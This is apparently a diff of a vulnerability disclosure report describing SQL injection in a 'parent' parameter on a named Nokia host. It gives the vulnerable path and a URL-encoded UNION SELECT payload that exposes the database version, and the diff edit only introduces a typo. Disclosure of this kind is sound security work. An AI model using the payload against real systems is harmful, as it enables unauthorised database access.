@@ -1,7 +1,7 @@
 # SQL injection in https://gdclive.nokia.com - parent param
 
 # Steps To Reproduce :
-* Visit this Path `/plugins/editors/jckeditor/plugins/jtreelink/dialogs/links.php?extension=menu&view=menu&parent=`
+* Visite this Path `/plugins/editors/jckeditor/plugins/jtreelink/dialogs/links.php?extension=menu&view=menu&parent=`
 * Add This Payload in parent param (`%22%20UNION%20SELECT%20NULL,NULL,@@version,NULL,NULL,NULL,NULL,NULL--%20aa`)
   #### Now you can see the version of database in url input
   
